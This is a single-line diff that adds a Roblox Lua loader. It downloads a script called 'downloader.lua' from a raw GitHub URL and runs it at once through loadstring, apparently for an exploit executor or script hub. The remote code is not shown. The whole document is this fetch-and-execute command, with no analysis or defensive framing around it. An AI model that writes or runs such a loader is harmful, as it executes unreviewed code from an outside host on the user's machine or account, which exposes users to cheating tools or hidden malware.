@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/amack7002-code/tapev4/main/downloader.lua", true))()
